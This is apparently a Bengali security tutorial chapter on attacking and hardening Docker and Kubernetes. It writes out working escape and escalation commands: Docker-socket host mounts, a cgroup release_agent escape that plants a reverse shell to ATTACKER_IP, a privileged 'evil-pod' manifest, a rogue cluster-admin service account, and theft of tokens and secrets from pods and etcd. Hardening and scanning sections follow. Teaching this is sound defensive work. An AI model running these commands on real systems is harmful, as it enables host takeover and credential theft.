---
title: 'কন্টেইনার ও কুবারনেটিস সিকিউরিটি'
subtitle: 'ডকার এস্কেপ টেকনিক, কুবারনেটিস অ্যাটাক, প্রিভিলেজড কন্টেইনার অ্যাবিউজ, ইমেজে সিক্রেট, আর হার্ডেনিং।'
chapter: 18
level: 'advanced'
readingTime: '14 মিনিট'
topics:
  [
    'Docker',
    'Kubernetes',
    'কন্টেইনার এস্কেপ',
    'K8s অ্যাটাক',
    'প্রিভিলেজড কন্টেইনার',
    'পড সিকিউরিটি',
    'কন্টেইনার সিকিউরিটি'
  ]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**বাস্তব জীবনের উপমা**

একটা কন্টেইনার অনেকটা জেল সেলের মতো — এর কাজ হলো তোমাকে অন্য কয়েদিদের (কন্টেইনার) আর গার্ডদের এলাকা (হোস্ট) থেকে আলাদা রাখা। একটা প্রিভিলেজড কন্টেইনার হলো এমন একটা সেল যার দরজার কব্জা খোলা — তুমি চাইলে ভেতর থেকেই সেটা খুলে ফেলতে পারো।

</Callout>

## গল্পে বুঝি

খোয়ারিজমি একটা বিশাল কার্গো জাহাজের ক্যাপ্টেন। জাহাজের ডেকে সারি সারি সিল করা shipping container — প্রতিটার নিজের মাল, নিজের তালা, একটা থেকে আরেকটায় ঢোকার কোনো পথ নেই। এটাই ছিল নিয়ম: প্রতিটা container আলাদা আর বন্ধ থাকবে, যাতে একটার ভেতরের কেউ বা কিছু বাকিদের নাগাল না পায়। এভাবেই জাহাজ চলত নিরাপদে।

কিন্তু একদিন সিনা খেয়াল করলেন, একটা container-এ কে যেন তাড়াহুড়ায় এমন একটা দরজা লাগিয়ে দিয়েছে যেটা সরাসরি জাহাজের ভেতরের করিডোরে খোলে। ফলে ঐ box-এ থাকা লোকটা তালা ভাঙার কষ্টই করল না — দরজা খুলে করিডোরে বেরিয়ে এল, পুরো জাহাজে হাঁটাহাঁটি করতে লাগল, আর শেষমেশ পৌঁছে গেল সেই bridge পর্যন্ত যেখান থেকে গোটা জাহাজ স্টিয়ার করা হয়। একটা box-এর অতিরিক্ত সুবিধা গোটা জাহাজকেই ঝুঁকিতে ফেলে দিল। ফাতিমা তখন সিদ্ধান্ত নিলেন — প্রতিটা container আবার ঠিকমতো সিল করতে হবে, কোনো box-কেই জাহাজের ভেতরে ঢোকার বিশেষ পথ দেওয়া যাবে না, আর bridge-এর দরজা শক্ত করে তালাবদ্ধ রাখতে হবে।

এই গল্পটাই container ও Kubernetes security। সিল করা আলাদা container-গুলো হলো ঠিকমতো isolated container; করিডোরে খোলা দরজাওয়ালা box-টা হলো একটা over-privileged বা দুর্বল isolation-এর container, যেটা দিয়ে attacker escape করে host পর্যন্ত পৌঁছে যায়; আর জাহাজের bridge-এ পৌঁছানো মানে Kubernetes-এর control plane বা API-তে হাত পাওয়া। সমাধানও একই — least privilege মেনে প্রতিটা container সিল রাখা, কোনো privileged container না চালানো, আর control plane-এর access লক করে রাখা। বাস্তবেও এভাবেই বড় বড় breach ঘটেছে: একটা privileged container বা এক্সপোজড control API থেকে attacker গোটা cluster দখল করে ফেলেছে — তাই defence মানে হলো box বন্ধ রাখা, বিশেষ সুবিধা না দেওয়া, আর bridge তালাবদ্ধ রাখা।

## ডকার সিকিউরিটির বেসিক

```bash
# Check if you're inside a container
cat /proc/1/cgroup | grep docker      # has docker IDs
ls /.dockerenv                         # file exists in containers
cat /proc/self/status | grep "CapEff" # effective capabilities

# Container usually has limited capabilities
# CapEff: 00000000a80425fb ← normal
# CapEff: 0000003fffffffff ← privileged! (all caps)
```

## ডকার সকেট এস্কেপ

ডকার সকেট (`/var/run/docker.sock`) ডকারের ওপর পুরো নিয়ন্ত্রণ দেয়। কন্টেইনারের ভেতরে এটা মাউন্ট করা থাকলে তুমি পুরো হোস্টের মালিক হয়ে যাচ্ছো।

```bash
# Check if docker socket is mounted
ls -la /var/run/docker.sock

# If it is — escape to host:
# Method 1: Mount host filesystem via Docker
docker run -v /:/host -it alpine chroot /host /bin/bash
# Now you're root on the host with full filesystem access

# Method 2: Use docker CLI inside container
docker run -it --rm --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# Method 3: curl Docker API directly
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

## প্রিভিলেজড কন্টেইনার এস্কেপ

```bash
# If container is privileged (--privileged flag)
# Check: cat /proc/self/status | grep CapEff → all F's

# Method 1: Mount host devices
fdisk -l                # list host disks
mount /dev/sda1 /mnt   # mount host root partition
chroot /mnt /bin/bash  # chroot into host

# Method 2: cgroups release_agent
# Create a cgroup, set release_agent to reverse shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /exploit
chmod +x /exploit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## কন্টেইনার মিসকনফিগারেশন স্ক্যানিং

```bash
# Trivy — image vulnerability scanner
trivy image nginx:1.18
trivy image --severity HIGH,CRITICAL myapp:latest
trivy fs /path/to/project   # scan local project

# Grype — vulnerability scanner
grype docker:nginx:1.18
grype dir:/path/to/project

# Checkov — IaC security scanner (Dockerfile, docker-compose, K8s manifests)
pip install checkov
checkov -f Dockerfile
checkov -d kubernetes/manifests/

# Docker Bench Security — CIS benchmark check
docker run --net host --pid host --userns host --cap-add audit_control \
  -v /etc:/etc:ro -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

## ডকার ইমেজে সিক্রেট

```bash
# Images are built in layers — even if you remove a file, it's in the layer history
docker history vulnerable-app:latest
docker save vulnerable-app:latest -o app.tar
tar xf app.tar
# Each layer is a tar — find the one with secrets

# dive — explore Docker image layers interactively
dive vulnerable-app:latest

# Find secrets in image filesystem
docker run --rm vulnerable-app:latest find / -name ".env" 2>/dev/null
docker run --rm vulnerable-app:latest find / -name "*.pem" 2>/dev/null
docker run --rm vulnerable-app:latest env | grep -i "key\|pass\|secret\|token"

# Automated secrets scanning
trufflehog docker --image vulnerable-app:latest
```

## কুবারনেটিস অ্যাটাক সারফেস

```
Attack paths:
  External → exposed K8s API (port 6443/8080)
  Compromised pod → lateral movement via K8s API
  Misconfigured RBAC → privilege escalation
  Secrets in env vars or volumes
  Insecure images → RCE → pod → cluster escape
```

## কুবারনেটিস এনুমারেশন

```bash
# kubectl basics (if you have kubeconfig)
kubectl get nodes
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get serviceaccounts --all-namespaces
kubectl get clusterroles,clusterrolebindings | grep -i admin

# Check your permissions
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets

# From inside a pod — service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use token to query API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k https://kubernetes.default.svc:443/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"

# KubeHunter — automated K8s vulnerability scanning
pip install kube-hunter
kube-hunter --remote 192.168.1.100    # external scan
kube-hunter --pod                      # from inside a pod
```

## কুবারনেটিস প্রিভিলেজ এস্কেলেশন

```bash
# If you can create pods — create privileged pod to escape to host
cat > evil-pod.yaml << EOF
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -n -i sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

kubectl apply -f evil-pod.yaml
kubectl exec -it evil-pod -- chroot /host /bin/bash
# Now on the node (host)

# If you can exec into existing privileged pods:
kubectl get pods --all-namespaces | grep privileged
kubectl exec -it -n kube-system kube-apiserver-master -- /bin/sh

# Service account escalation
# If SA has cluster-admin binding:
curl -k https://kubernetes.default.svc:443/api/v1/nodes \
  -H "Authorization: Bearer $TOKEN"

# Create new cluster-admin SA
kubectl create serviceaccount pwned
kubectl create clusterrolebinding pwned-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:pwned
```

## কুবারনেটিস RBAC মিসকনফিগারেশন

```bash
# Wildcard permissions (should never exist)
# rules:
# - apiGroups: ["*"]
#   resources: ["*"]
#   verbs: ["*"]

# Find overpermissioned accounts
kubectl get clusterrolebindings -o json | jq '.items[] |
  select(.roleRef.name == "cluster-admin") | .subjects'

# exec privilege → container escape
# If you can exec into pods, you can escalate from privileged pods

# list/get secrets → steal credentials
kubectl get secret db-secret -o jsonpath='{.data.password}' | base64 -d

# impersonate user
kubectl get pods --as=cluster-admin
kubectl --as=system:serviceaccount:kube-system:default get secrets
```

## etcd — K8s-এর মস্তিষ্ক

```bash
# etcd stores all cluster state including secrets in base64
# If you can reach etcd directly (2379/tcp):

etcdctl --endpoints https://127.0.0.1:2379 \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt \
  --key /etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/default/db-secret

# Output includes base64-encoded secret values
# On managed clusters (EKS, GKE): etcd is not directly accessible — still check RBAC
```

## কন্টেইনার হার্ডেনিং চেকলিস্ট

```yaml
# Security context best practices (Kubernetes)
securityContext:
  runAsNonRoot: true                # don't run as root
  runAsUser: 10000                  # specific non-root UID
  readOnlyRootFilesystem: true      # prevent writing to container FS
  allowPrivilegeEscalation: false   # block setuid and sudo
  capabilities:
    drop:
      - ALL                         # drop all Linux capabilities
    add:
      - NET_BIND_SERVICE            # only add what's needed

# Pod Security Standards (K8s 1.25+)
# Label namespace to enforce:
kubectl label namespace production pod-security.kubernetes.io/enforce=restricted

# Network Policies — deny all by default
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

## রিয়েল প্রজেক্ট: KubeCTF

```bash
# Local K8s practice: kind (Kubernetes in Docker)
kind create cluster --name pwn-lab

# Vulnerable K8s scenarios:
# - Katacoda Kubernetes Security scenarios (free, browser-based)
# - HackTheBox K8s machines
# - KubeCon CTF writeups (ctftime.org)

# Deploy a misconfigured app for practice
kubectl run juiceshop --image=bkimminich/juice-shop --port=3000
kubectl expose pod juiceshop --type=NodePort --port=3000
# Attack the app, escape the container, pivot to cluster admin
```
